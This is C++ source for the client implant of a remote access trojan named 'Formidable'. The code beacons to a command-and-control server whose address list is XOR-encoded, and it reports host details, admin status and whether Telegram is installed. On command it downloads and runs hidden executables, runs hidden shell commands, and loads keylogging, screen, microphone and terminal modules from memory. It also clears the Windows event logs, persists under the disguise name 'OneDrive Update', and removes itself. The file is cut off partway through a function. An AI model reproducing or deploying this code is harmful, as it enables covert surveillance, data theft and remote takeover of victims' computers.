#include "ClientCore.h"
#include "Utils.h"
#include "../ClientSide/Client/Utils/Logger.h"
#include "../ClientSide/Client/Core/AutomationManager.h"
#include <thread>
#include <vector>
#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <algorithm>
#include <sstream>
#include <urlmon.h>
#include <shellapi.h>

#pragma comment(lib, "urlmon.lib")

namespace Formidable {

    // 全局变量定义
    CONNECT_ADDRESS g_ServerConfig = DEFAULT_CONFIG;
    bool g_IsService = false;
    HMEMORYMODULE g_hTerminalModule = NULL;
    PFN_MODULE_ENTRY g_pTerminalEntry = NULL;
    HMEMORYMODULE g_hMultimediaModule = NULL;
    PFN_MODULE_ENTRY g_pMultimediaEntry = NULL;
    std::map<uint32_t, HMEMORYMODULE> g_ModuleCache;
    std::map<uint32_t, PFN_MODULE_ENTRY> g_ModuleEntryCache;

    CRITICAL_SECTION g_ModuleMutex;
    CRITICAL_SECTION g_TerminalMutex;
    CRITICAL_SECTION g_MultimediaMutex;
    CRITICAL_SECTION g_SendMutex;

    // 安全调用模块入口
    void SafeCallModuleEntry(PFN_MODULE_ENTRY pEntry, SOCKET s, CommandPkg* pkg) {
        __try {
            pEntry(s, pkg);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            OutputDebugStringA("[ClientCore] Exception in ModuleEntry!\n");
#ifdef _DEBUG
            MessageBoxA(NULL, "Exception in ModuleEntry!", "Crash", MB_OK | MB_ICONERROR);
#endif
        }
    }

    // 尝试获取导出函数 (兼容 x86 stdcall 修饰名)
    FARPROC TryGetProcAddress(HMEMORYMODULE hMod, const char* name, int argSize) {
        FARPROC p = MemoryGetProcAddress(hMod, name);
        if (p) return p;
#ifdef _X86_
        char buf[64];
        sprintf_s(buf, "_%s@%d", name, argSize);
        p = MemoryGetProcAddress(hMod, buf);
#endif
        return p;
    }

    void InitClientCore() {
        InitializeCriticalSection(&g_ModuleMutex);
        InitializeCriticalSection(&g_TerminalMutex);
        InitializeCriticalSection(&g_MultimediaMutex);
        InitializeCriticalSection(&g_SendMutex);
    }

    void CleanupClientCore() {
        DeleteCriticalSection(&g_ModuleMutex);
        DeleteCriticalSection(&g_TerminalMutex);
        DeleteCriticalSection(&g_MultimediaMutex);
        DeleteCriticalSection(&g_SendMutex);
    }

    void GetClientInfo(ClientInfo& info) {
        memset(&info, 0, sizeof(ClientInfo));
        
        // 基础系统信息
        std::string os = GetOSVersion();
        int bits = GetOSBits();
        if (bits == 64) os += " x64";
        else os += " x86";
        strncpy(info.osVersion, os.c_str(), sizeof(info.osVersion) - 1);
        
        wchar_t wBuf[MAX_PATH];
        DWORD size = MAX_PATH;
        if (GetComputerNameW(wBuf, &size)) {
            std::string utf8 = WideToUTF8(wBuf);
            strncpy(info.computerName, utf8.c_str(), sizeof(info.computerName) - 1);
        } else {
            char envBuf[MAX_PATH];
            if (GetEnvironmentVariableA("COMPUTERNAME", envBuf, MAX_PATH)) {
                strncpy(info.computerName, envBuf, sizeof(info.computerName) - 1);
            } else {
                strncpy(info.computerName, "Unknown Host", sizeof(info.computerName) - 1);
            }
        }
        
        size = MAX_PATH;
        if (GetUserNameW(wBuf, &size)) {
            std::string utf8 = WideToUTF8(wBuf);
            strncpy(info.userName, utf8.c_str(), sizeof(info.userName) - 1);
        } else {
            char envBuf[MAX_PATH];
            if (GetEnvironmentVariableA("USERNAME", envBuf, MAX_PATH)) {
                strncpy(info.userName, envBuf, sizeof(info.userName) - 1);
            } else {
                strncpy(info.userName, "SYSTEM", sizeof(info.userName) - 1);
            }
        }

        strncpy(info.cpuInfo, GetCpuBrand().c_str(), sizeof(info.cpuInfo) - 1);
        strncpy(info.lanAddr, GetLocalIP().c_str(), sizeof(info.lanAddr) - 1);
        strncpy(info.publicAddr, GetPublicIP().c_str(), sizeof(info.publicAddr) - 1);
        
        info.processID = GetCurrentProcessId();
        info.is64Bit = (bits == 64);
        info.isAdmin = IsAdmin() ? 1 : 0;
        info.clientType = g_ServerConfig.iType;
        info.clientUniqueId = GetStableClientUniqueId(g_ServerConfig.clientID);
        info.hasCamera = CheckCameraExistence() ? 1 : 0;
        info.hasTelegram = CheckTelegramInstalled() ? 1 : 0;
        info.cpuLoad = GetCpuLoad();
        info.memUsage = GetMemoryUsage();
        info.diskUsage = GetDiskUsage();

        wchar_t exePathW[MAX_PATH] = { 0 };
        GetModuleFileNameW(NULL, exePathW, MAX_PATH);
        std::string exePath = WideToUTF8(exePathW);
        strncpy(info.programPath, exePath.c_str(), sizeof(info.programPath) - 1);
        
        std::wstring wGroup = UTF8ToWide(g_ServerConfig.szGroupName);
        wcsncpy(info.group, wGroup.c_str(), 127);

        std::string activeWin = ActivityMonitor::GetStatus();
        strncpy(info.activeWindow, activeWin.c_str(), sizeof(info.activeWindow) - 1);
        
        strncpy(info.version, GetExeVersion().c_str(), sizeof(info.version) - 1);
        strncpy(info.installTime, GetProcessStartTime().c_str(), sizeof(info.installTime) - 1);
        strncpy(info.uptime, GetSystemUptime().c_str(), sizeof(info.uptime) - 1);
    }

    void SendPkg(SOCKET s, const void* data, int len) {
        EnterCriticalSection(&g_SendMutex);
        PkgHeader header;
        memcpy(header.flag, "FRMD26?", 7);
        header.originLen = len;
        header.totalLen = sizeof(PkgHeader) + len;
        send(s, (char*)&header, sizeof(PkgHeader), 0);
        send(s, (char*)data, len, 0);
        LeaveCriticalSection(&g_SendMutex);
    }

    uint32_t GetModuleKey(uint32_t cmd) {
        switch (cmd) {
            case CMD_PROCESS_LIST:
            case CMD_PROCESS_KILL:
            case CMD_PROCESS_MODULES:
                return CMD_PROCESS_LIST;
            case CMD_WINDOW_LIST:
            case CMD_WINDOW_CTRL:
                return CMD_WINDOW_LIST;
            case CMD_FILE_LIST:
            case CMD_FILE_DOWNLOAD:
            case CMD_FILE_DOWNLOAD_DIR:
            case CMD_FILE_UPLOAD:
            case CMD_FILE_DELETE:
            case CMD_FILE_RENAME:
            case CMD_FILE_RUN:
        case CMD_FILE_MONITOR:
        case CMD_FILE_PREVIEW:
        case CMD_FILE_HISTORY:
        case CMD_FILE_PERF:
                return CMD_FILE_LIST;
            case CMD_SERVICE_LIST:
            case CMD_SERVICE_START:
            case CMD_SERVICE_STOP:
            case CMD_SERVICE_DELETE:
                return CMD_SERVICE_LIST;
            case CMD_REGISTRY_CTRL:
                return CMD_REGISTRY_CTRL;
            case CMD_GET_SYSINFO:
                return CMD_GET_SYSINFO;
        }
        return 0;
    }

    void LoadModuleFromMemory(SOCKET s, CommandPkg* pkg, int totalDataLen) {
        Formidable::Client::Utils::Logger::Log(Formidable::Client::Utils::LogLevel::LL_INFO, "Processing Module Command: " + std::to_string(pkg->cmd));
        bool hasDll = totalDataLen > (int)sizeof(CommandPkg);
        uint32_t effectiveCmd = pkg->cmd;
        if (pkg->cmd == CMD_LOAD_MODULE && pkg->arg2 != 0) {
            effectiveCmd = pkg->arg2;
        }

        bool isMultimedia = (effectiveCmd == CMD_SCREEN_CAPTURE || effectiveCmd == CMD_VIDEO_STREAM || 
                             effectiveCmd == CMD_VOICE_STREAM || effectiveCmd == CMD_KEYLOG ||
                             effectiveCmd == CMD_MOUSE_EVENT || effectiveCmd == CMD_KEY_EVENT ||
                             effectiveCmd == CMD_SCREEN_FPS || effectiveCmd == CMD_SCREEN_QUALITY ||
                             effectiveCmd == CMD_SCREEN_COMPRESS);

        if (isMultimedia && g_hMultimediaModule) {
            EnterCriticalSection(&g_MultimediaMutex);
            if (g_pMultimediaEntry) {
                if (pkg->cmd == CMD_LOAD_MODULE && pkg->arg2 != 0) {
                    CommandPkg runPkg = { 0 };
                    runPkg.cmd = effectiveCmd;
                    runPkg.arg1 = 1;
                    runPkg.arg2 = 0;
                    SafeCallModuleEntry(g_pMultimediaEntry, s, &runPkg);
                } else {
                    SafeCallModuleEntry(g_pMultimediaEntry, s, pkg);
                }
            }
            LeaveCriticalSection(&g_MultimediaMutex);
            return;
        }

        uint32_t dllSize = pkg->arg1;
        char* dllData = pkg->data;
        if (dllSize == 0) return;

        HMEMORYMODULE hMod = MemoryLoadLibrary(dllData, dllSize);
        if (hMod) {
            // ModuleEntry has 2 args (SOCKET, CommandPkg*), so 8 bytes on x86
            PFN_MODULE_ENTRY pEntry = (PFN_MODULE_ENTRY)TryGetProcAddress(hMod, "ModuleEntry", 8);
            if (pEntry) {
                if (effectiveCmd == CMD_TERMINAL_OPEN) {
                    EnterCriticalSection(&g_TerminalMutex);
                    g_hTerminalModule = hMod;
                    g_pTerminalEntry = pEntry;
                    LeaveCriticalSection(&g_TerminalMutex);
                    SafeCallModuleEntry(pEntry, s, pkg); 
                    return; 
                }
                if (isMultimedia) {
                    EnterCriticalSection(&g_MultimediaMutex);
                    g_hMultimediaModule = hMod;
                    g_pMultimediaEntry = pEntry;
                    LeaveCriticalSection(&g_MultimediaMutex);
                    CommandPkg runPkg = { 0 };
                    runPkg.cmd = effectiveCmd;
                    runPkg.arg1 = 1;
                    runPkg.arg2 = 0;
                    SafeCallModuleEntry(pEntry, s, &runPkg);
                    return;
                }

                uint32_t moduleKey = GetModuleKey(effectiveCmd);
                if (moduleKey == 0) moduleKey = effectiveCmd;

                EnterCriticalSection(&g_ModuleMutex);
                auto it = g_ModuleCache.find(moduleKey);
                if (it != g_ModuleCache.end()) {
                    MemoryFreeLibrary(it->second);
                }
                g_ModuleCache[moduleKey] = hMod;
                g_ModuleEntryCache[moduleKey] = pEntry;
                LeaveCriticalSection(&g_ModuleMutex);

                CommandPkg runPkg = *pkg;
                runPkg.cmd = moduleKey;
                runPkg.arg1 = 0; 
                runPkg.arg2 = 0;
                SafeCallModuleEntry(pEntry, s, &runPkg);
                return;
            }
            MemoryFreeLibrary(hMod);
        }
    }

    // 搜索文件辅助函数
    void SearchFiles(const std::wstring& dir, const std::wstring& pattern, std::string& result, int& count) {
        if (count > 1000) return; // 限制结果数量

        WIN32_FIND_DATAW findData;
        HANDLE hFind;

        // 搜索当前目录下的匹配文件
        std::wstring searchPath = dir + L"\\" + pattern;
        hFind = FindFirstFileW(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    std::wstring fullPath = dir + L"\\" + findData.cFileName;
                    result += WideToUTF8(fullPath) + "\n";
                    count++;
                    if (count > 1000) break;
                }
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }

        if (count > 1000) return;

        // 递归子目录
        std::wstring allPath = dir + L"\\*";
        hFind = FindFirstFileW(allPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && 
                    wcscmp(findData.cFileName, L".") != 0 && 
                    wcscmp(findData.cFileName, L"..") != 0) {
                    
                    std::wstring subDir = dir + L"\\" + findData.cFileName;
                    SearchFiles(subDir, pattern, result, count);
                    if (count > 1000) break;
                }
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }

    void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
        switch (pkg->cmd) {
            case CMD_FILE_SEARCH: {
                int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
                if (dataLen > 0) {
                    std::string payload(pkg->data, dataLen);
                    size_t sep = payload.find('|');
                    if (sep != std::string::npos) {
                        std::string path = payload.substr(0, sep);
                        std::string pattern = payload.substr(sep + 1);
                        Formidable::Client::Utils::Logger::Log(Formidable::Client::Utils::LogLevel::LL_INFO, "Searching files in " + path + " with pattern " + pattern);
                        std::string result = "";
                        int count = 0;
                        SearchFiles(UTF8ToWide(path), UTF8ToWide(pattern), result, count);
                        
                        size_t bodySize = sizeof(CommandPkg) - 1 + result.size();
                        std::vector<char> buffer(bodySize);
                        CommandPkg* pkgResp = (CommandPkg*)buffer.data();
                        pkgResp->cmd = CMD_FILE_SEARCH;
                        pkgResp->arg1 = (uint32_t)result.size();
                        pkgResp->arg2 = 0;
                        memcpy(pkgResp->data, result.c_str(), result.size());
                        SendPkg(s, buffer.data(), (int)bodySize);
                    }
                }
                break;
            }
            case CMD_FILE_MONITOR: {
                int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
                if (dataLen > 0) {
                    std::string path(pkg->data, dataLen);
                    Formidable::Client::Utils::Logger::Log(Formidable::Client::Utils::LogLevel::LL_INFO, "Starting file monitor on " + path);
                    std::wstring wPath = UTF8ToWide(path);
                    
                    // 启动监控线程 (简单实现，仅监控文件名变更)
                    std::thread([s, wPath]() {
                        HANDLE hDir = CreateFileW(wPath.c_str(), FILE_LIST_DIRECTORY, 
                            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
                            NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
                            
                        if (hDir != INVALID_HANDLE_VALUE) {
                            char notifyBuf[1024];
                            DWORD bytesReturned;
                            while (true) {
                                if (ReadDirectoryChangesW(hDir, notifyBuf, sizeof(notifyBuf), TRUE, 
                                    FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME | FILE_NOTIFY_CHANGE_LAST_WRITE, 
                                    &bytesReturned, NULL, NULL)) {
                                    
                                    FILE_NOTIFY_INFORMATION* pNotify = (FILE_NOTIFY_INFORMATION*)notifyBuf;
                                    std::wstring fileName(pNotify->FileName, pNotify->FileNameLength / sizeof(wchar_t));
                                    std::string utf8Name = WideToUTF8(fileName);
                                    std::string msg = "Change: " + utf8Name + "\n";
                                    
                                    size_t bodySize = sizeof(CommandPkg) - 1 + msg.size();
                                    std::vector<char> buffer(bodySize);
                                    CommandPkg* pkgResp = (CommandPkg*)buffer.data();
                                    pkgResp->cmd = CMD_FILE_MONITOR;
                                    pkgResp->arg1 = (uint32_t)msg.size();
                                    pkgResp->arg2 = 0;
                                    memcpy(pkgResp->data, msg.c_str(), msg.size());
                                    
                                    // 注意：这里需要检查 socket 是否有效，但为了简单起见暂时忽略
                                    // 实际应使用 shared_ptr 或弱引用管理 socket 生命周期
                                    SendPkg(s, buffer.data(), (int)bodySize);
                                    
                                    if (pNotify->NextEntryOffset == 0) break;
                                } else {
                                    break;
                                }
                            }
                            CloseHandle(hDir);
                        }
                    }).detach();
                }
                break;
            }
            case CMD_HEARTBEAT: {
                ClientInfo info;
                GetClientInfo(info);
                size_t bodySize = sizeof(CommandPkg) - 1 + sizeof(ClientInfo);
                std::vector<char> buffer(bodySize);
                CommandPkg* pkgResp = (CommandPkg*)buffer.data();
                pkgResp->cmd = CMD_HEARTBEAT;
                pkgResp->arg1 = sizeof(ClientInfo);
                pkgResp->arg2 = 0;
                memcpy(pkgResp->data, &info, sizeof(ClientInfo));
                SendPkg(s, buffer.data(), (int)bodySize);
                break;
            }
            case CMD_CLIPBOARD_GET: {
                std::string text = GetClipboardText();
                size_t bodySize = sizeof(CommandPkg) - 1 + text.size();
                std::vector<char> buffer(bodySize);
                CommandPkg* pkgResp = (CommandPkg*)buffer.data();
                pkgResp->cmd = CMD_CLIPBOARD_GET;
                pkgResp->arg1 = (uint32_t)text.size();
                pkgResp->arg2 = 0;
                memcpy(pkgResp->data, text.c_str(), text.size());
                SendPkg(s, buffer.data(), (int)bodySize);
                break;
            }
            case CMD_CLIPBOARD_SET:
                SetClipboardText(pkg->data);
                break;
            case CMD_POWER_SHUTDOWN:
                EnableDebugPrivilege();
                ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
                break;
            case CMD_POWER_REBOOT:
                EnableDebugPrivilege();
                ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
                break;
            case CMD_POWER_LOGOUT:
                ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
                break;
            case CMD_UNINSTALL: {
                std::wstring baseName = L"OneDrive Update";
                std::wstring configInstallName = UTF8ToWide(g_ServerConfig.szInstallName);
                if (!configInstallName.empty()) {
                    baseName = configInstallName;
                    if (baseName.length() > 4 && _wcsicmp(baseName.c_str() + baseName.length() - 4, L".exe") == 0) {
                        baseName = baseName.substr(0, baseName.length() - 4);
                    }
                }

                // 移除自启动 (注册表)
                RemoveFromStartup(WideToUTF8(baseName));
                RemoveFromStartup("Formidable2026"); // 兼容旧版本
                
                // 移除自启动 (服务)
                SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
                if (hSCM) {
                    // 尝试移除新旧两个名称的服务
                    const wchar_t* serviceNames[] = { baseName.c_str(), L"Formidable2026" };
                    for (const wchar_t* sName : serviceNames) {
                        SC_HANDLE hService = OpenServiceW(hSCM, sName, SERVICE_ALL_ACCESS);
                        if (hService) {
                            SERVICE_STATUS status;
                            ControlService(hService, SERVICE_CONTROL_STOP, &status);
                            DeleteService(hService);
                            CloseServiceHandle(hService);
                        }
                    }
                    CloseServiceHandle(hSCM);
                }

                // 移除计划任务
                wchar_t szTaskCmd[512];
                swprintf_s(szTaskCmd, 512, L"schtasks /delete /tn \"%s\" /f", baseName.c_str());
                _wsystem(szTaskCmd);
                _wsystem(L"schtasks /delete /tn \"Formidable2026\" /f"); // 兼容旧版本

                // 获取自身路径
                wchar_t szPath[MAX_PATH];
                GetModuleFileNameW(NULL, szPath, MAX_PATH);
                
                // 创建自删除批处理
                wchar_t szBatchPath[MAX_PATH];
                GetTempPathW(MAX_PATH, szBatchPath);
                wcscat_s(szBatchPath, L"uninstall.bat");
                
                FILE* f = _wfopen(szBatchPath, L"w");
                if (f) {
                    fwprintf(f, L"@echo off\n");
                    fwprintf(f, L"ping 127.0.0.1 -n 2 > nul\n");
                    fwprintf(f, L"del /f /q \"%s\"\n", szPath);
                    fwprintf(f, L"del /f /q \"%%~f0\"\n");
                    fclose(f);
                    
                    // 执行批处理并退出
                    ShellExecuteW(NULL, L"open", szBatchPath, NULL, NULL, SW_HIDE);
                    ExitProcess(0);
                }
                break;
            }
            case CMD_SET_GROUP: {
                int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
                if (dataLen > 0 && dataLen < 128) {
                    std::string groupName(pkg->data, dataLen);
                    strncpy(g_ServerConfig.szGroupName, groupName.c_str(), 127);
                }
                break;
            }
            case CMD_DOWNLOAD_EXEC: {
                int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
                std::string url(pkg->data, dataLen);
                wchar_t szTempPath[MAX_PATH];
                GetTempPathW(MAX_PATH, szTempPath);
                wcscat_s(szTempPath, L"downloaded.exe");
                std::wstring wUrl = UTF8ToWide(url);
                if (S_OK == URLDownloadToFileW(NULL, wUrl.c_str(), szTempPath, 0, NULL)) {
                    ShellExecuteW(NULL, L"open", szTempPath, NULL, NULL, SW_HIDE);
                }
                break;
            }
            case CMD_UPLOAD_EXEC: {
                int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
                if (dataLen > 4) {
                    uint32_t nameLen = *(uint32_t*)pkg->data;
                    if (nameLen > 0 && nameLen < 256 && (int)(4 + nameLen) < dataLen) {
                        std::string fileName(pkg->data + 4, nameLen);
                        int fileSize = dataLen - 4 - (int)nameLen;
                        wchar_t szTempPath[MAX_PATH];
                        GetTempPathW(MAX_PATH, szTempPath);
                        std::wstring wFileName = UTF8ToWide(fileName);
                        wcscat_s(szTempPath, wFileName.c_str());
                        HANDLE hFile = CreateFileW(szTempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
                        if (hFile != INVALID_HANDLE_VALUE) {
                            DWORD written;
                            WriteFile(hFile, pkg->data + 4 + nameLen, fileSize, &written, NULL);
                            CloseHandle(hFile);
                            ShellExecuteW(NULL, L"open", szTempPath, NULL, NULL, SW_HIDE);
                        }
                    }
                }
                break;
            }
            case CMD_OPEN_URL: {
                int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
                std::string url(pkg->data, dataLen);
                std::wstring wUrl = UTF8ToWide(url);
                ShellExecuteW(NULL, L"open", wUrl.c_str(), NULL, NULL, SW_SHOW);
                break;
            }
            case CMD_SHELL_EXEC: {
                int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
                if (dataLen > 0) {
                    std::string cmd(pkg->data, dataLen);
                    std::wstring wCmd = UTF8ToWide(cmd);
                    ShellExecuteW(NULL, L"open", L"cmd.exe", (L"/c " + wCmd).c_str(), NULL, SW_HIDE);
                }
                break;
            }
            case CMD_CLEAN_EVENT_LOG: {
                EnableDebugPrivilege();
                const wchar_t* logs[] = { L"System", L"Application", L"Security" };
                for (int i = 0; i < 3; i++) {
                    HANDLE hLog = OpenEventLogW(NULL, logs[i]);
                    if (hLog) {
                        ClearEventLogW(hLog, NULL);
                        CloseEventLog(hLog);
                    }
                }
                break;
            }
            case CMD_MESSAGEBOX: {
                int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
                if (dataLen > 0) {
                    std::string message(pkg->data, dataLen);
                    std::wstring wMessage = UTF8ToWide(message);
                    MessageBoxW(NULL, wMessage.c_str(), L"Message from Master", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
                }
                break;
            }
            case CMD_RECONNECT:
                closesocket(s);
                break;
            case CMD_TERMINAL_OPEN:
            case CMD_LOAD_MODULE:
            case CMD_SCREEN_CAPTURE:
            case CMD_VOICE_STREAM:
            case CMD_VIDEO_STREAM:
            case CMD_KEYLOG:
            case CMD_MOUSE_EVENT:
            case CMD_KEY_EVENT:
            case CMD_SCREEN_FPS:
            case CMD_SCREEN_QUALITY:
            case CMD_SCREEN_COMPRESS:
                LoadModuleFromMemory(s, pkg, totalDataLen);
                break;
            case CMD_TERMINAL_DATA:
                EnterCriticalSection(&g_TerminalMutex);
                if (g_pTerminalEntry) SafeCallModuleEntry(g_pTerminalEntry, s, pkg);
                LeaveCriticalSection(&g_TerminalMutex);
                break;
            case CMD_TERMINAL_CLOSE:
                EnterCriticalSection(&g_TerminalMutex);
                if (g_pTerminalEntry) {
                    SafeCallModuleEntry(g_pTerminalEntry, s, pkg);
                    if (g_hTerminalModule) {
                        MemoryFreeLibrary(g_hTerminalModule);
                        g_hTerminalModule = NULL;
                        g_pTerminalEntry = NULL;
                    }
                }
                LeaveCriticalSection(&g_TerminalMutex);
                break;
            case CMD_GET_SYSINFO:
            case CMD_FILE_LIST:
            case CMD_FILE_DOWNLOAD_DIR:
            case CMD_PROCESS_LIST:
            case CMD_PROCESS_KILL:
            case CMD_PROCESS_MODULES:
            case CMD_WINDOW_LIST:
            case CMD_WINDOW_CTRL:
            case CMD_SERVICE_LIST:
            case CMD_SERVICE_START:
            case CMD_SERVICE_STOP:
            case CMD_SERVICE_DELETE:
            case CMD_REGISTRY_CTRL: {
                uint32_t moduleKey = GetModuleKey(pkg->cmd);
                EnterCriticalSection(&g_ModuleMutex);
                auto it = g_ModuleEntryCache.find(moduleKey);
                if (it != g_ModuleEntryCache.end()) {
                    PFN_MODULE_ENTRY pEntry = it->second;
                    LeaveCriticalSection(&g_ModuleMutex);
                    SafeCallModuleEntry(pEntry, s, pkg);
                } else {
                    LeaveCriticalSection(&g_ModuleMutex);
                    LoadModuleFromMemory(s, pkg, totalDataLen);
                }
                break;
            }
            case CMD_EXIT:
                ExitProcess(0);
                break;
            case CMD_EXEC_GET_OUTPUT: {
                int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
                if (dataLen > 0) {
                    std::string cmd(pkg->data, dataLen);
                    std::string output = ExecuteCmdAndGetOutput(cmd);
                    
                    size_t respSize = sizeof(CommandPkg) - 1 + output.size();
                    std::vector<char> respBuf(sizeof(PkgHeader) + respSize);
                    PkgHeader* h = (PkgHeader*)respBuf.data();
                    memcpy(h->flag, "FRMD26?", 7);
                    h->originLen = (int)respSize;
                    h->totalLen = (int)respBuf.size();
                    
                    CommandPkg* p = (CommandPkg*)(respBuf.data() + sizeof(PkgHeader));
                    p->cmd = CMD_EXEC_GET_OUTPUT;
                    p->arg1 = (uint32_t)output.size();
                    p->arg2 = 0;
                    memcpy(p->data, output.data(), output.size());
                    
                    send(s, respBuf.data(), (int)respBuf.size(), 0);
                }
                break;
            }
        }
    }

    void HandleConnection(ConnectionContext* ctx) {
        ctx->bConnected->store(true);
        Formidable::Client::Utils::Logger::Log(Formidable::Client::Utils::LogLevel::LL_INFO, "Connected to " + ctx->serverIp);
        ClientInfo info;
        GetClientInfo(info);
        SendPkg(ctx->s, &info, sizeof(ClientInfo));
        
        // Heartbeat task via AutomationManager
        int hbTaskId = Formidable::Client::Core::AutomationManager::AddTask([ctx]() {
            if (!ctx->bConnected->load()) return;
            
            ClientInfo hbInfo;
            GetClientInfo(hbInfo);
            
            size_t hbBodySize = sizeof(CommandPkg) - 1 + sizeof(ClientInfo);
            std::vector<char> hbBuf(sizeof(PkgHeader) + hbBodySize);
            PkgHeader* h = (PkgHeader*)hbBuf.data();
            memcpy(h->flag, "FRMD26?", 7);
            h->originLen = (int)hbBodySize;
            h->totalLen = (int)hbBuf.size();
            
            CommandPkg* p = (CommandPkg*)(hbBuf.data() + sizeof(PkgHeader));
            p->cmd = CMD_HEARTBEAT;
            p->arg1 = sizeof(ClientInfo);
            p->arg2 = 0;
            memcpy(p->data, &hbInfo, sizeof(ClientInfo));
            
            send(ctx->s, hbBuf.data(), (int)hbBuf.size(), 0);
        }, 5000);

        while (!ctx->bShouldExit->load()) {
            PkgHeader header;
            int n = recv(ctx->s, (char*)&header, sizeof(PkgHeader), 0);
            if (n <= 0) break;
            if (memcmp(header.flag, "FRMD26?", 7) != 0) break;
            std::vector<char> body(header.originLen);
            int total = 0;
            while (total < header.originLen) {
                int r = recv(ctx->s, body.data() + total, header.originLen - total, 0);
                if (r <= 0) break;
                total += r;
            }
            if (total == header.originLen) {
                HandleCommand(ctx->s, (CommandPkg*)body.data(), header.originLen);
            } else break;
        }
        
        ctx->bConnected->store(false);
        Formidable::Client::Core::AutomationManager::RemoveTask(hbTaskId);
        Formidable::Client::Utils::Logger::Log(Formidable::Client::Utils::LogLevel::LL_WARNING, "Disconnected");
    }

    void RunClientLoop(std::atomic<bool>& bShouldExit, std::atomic<bool>& bConnected) {
        while (!bShouldExit) {
            WSADATA wsaData;
            WSAStartup(MAKEWORD(2, 2), &wsaData);

            std::string rawServerIps = g_ServerConfig.szServerIP;
            if (g_ServerConfig.bEncrypt) {
                for (size_t k = 0; k < rawServerIps.length(); k++) {
                    rawServerIps[k] ^= 0x5A;
                }
            }
            
            std::vector<std::string> serverList;
            std::stringstream ss(rawServerIps);
            std::string item;
            while (std::getline(ss, item, ',')) {
                if (!item.empty()) serverList.push_back(item);
            }
            if (serverList.empty()) serverList.push_back("127.0.0.1");

            // 处理上线模式：随机模式下打乱服务器列表
            if (g_ServerConfig.runningType == 0 && serverList.size() > 1) {
                std::srand((unsigned int)time(NULL));
                for (size_t i = serverList.size() - 1; i > 0; --i) {
                    size_t j = std::rand() % (i + 1);
                    std::swap(serverList[i], serverList[j]);
                }
            }

            bool connected = false;
            for (const auto& serverIp : serverList) {
                if (bShouldExit) break;
                
                int type = (g_ServerConfig.protoType == 1) ? SOCK_DGRAM : SOCK_STREAM;
                int proto = (g_ServerConfig.protoType == 1) ? IPPROTO_UDP : IPPROTO_TCP;
                
                SOCKET s = socket(AF_INET, type, proto);
                if (s == INVALID_SOCKET) continue;

                int port = atoi(g_ServerConfig.szPort);
                std::string serverPort = g_ServerConfig.szPort;

                sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, serverIp.c_str(), &addr.sin_addr);

                Formidable::Client::Utils::Logger::Log(Formidable::Client::Utils::LogLevel::LL_INFO, "Attempting " + std::string(g_ServerConfig.protoType == 1 ? "UDP" : "TCP") + " connection to " + serverIp);

                if (g_ServerConfig.protoType == 1) {
                    // UDP "connection" - just handle it
                    connected = true;
                    ConnectionContext ctx = { s, serverIp, serverPort, &bConnected, &bShouldExit };
                    HandleConnection(&ctx);
                    closesocket(s);
                    break;
                } else {
                    if (connect(s, (sockaddr*)&addr, sizeof(addr)) == 0) {
                        connected = true;
                        ConnectionContext ctx = { s, serverIp, serverPort, &bConnected, &bShouldExit };
                        HandleConnection(&ctx);
                        closesocket(s);
                        break; 
                    }
                }
                closesocket(s);
            }

            WSACleanup();
            if (!bShouldExit) Sleep(5000);
        }
    }

    void ProcessPayload() {
        if (g_ServerConfig.payloadType == 1) { // 下载并执行 EXE
            std::wstring url = UTF8ToWide(g_ServerConfig.szDownloadUrl);
            if (!url.empty()) {
                wchar_t tempPath[MAX_PATH], tempFile[MAX_PATH];
                GetTempPathW(MAX_PATH, tempPath);
                GetTempFileNameW(tempPath, L"FRM", 0, tempFile);
                
                std::wstring exeFile = tempFile;
                exeFile += L".exe";
                
                if (URLDownloadToFileW(NULL, url.c_str(), exeFile.c_str(), 0, NULL) == S_OK) {
                    ShellExecuteW(NULL, L"open", exeFile.c_str(), NULL, NULL, SW_HIDE);
                }
            }
        }
        else if (g_ServerConfig.payloadType == 2) { // 远程加载 DLL (内存加载)
            std::wstring url = UTF8ToWide(g_ServerConfig.szDownloadUrl);
            if (!url.empty()) {
                CreateThread(NULL, 0, [](LPVOID lpParam) -> DWORD {
                    std::wstring dllUrl = *(std::wstring*)lpParam;
                    delete (std::wstring*)lpParam;

                    IStream* pStream = NULL;
                    HRESULT hr = URLOpenBlockingStreamW(NULL, dllUrl.c_str(), &pStream, 0, NULL);
                    if (hr == S_OK) {
                        std::vector<char> buffer;
                        char tmp[4096];
                        ULONG read = 0;
                        while (pStream->Read(tmp, sizeof(tmp), &read) == S_OK && read > 0) {
                            size_t oldSize = buffer.size();
                            buffer.resize(oldSize + read);
                            memcpy(buffer.data() + oldSize, tmp, read);
                        }
                        pStream->Release();

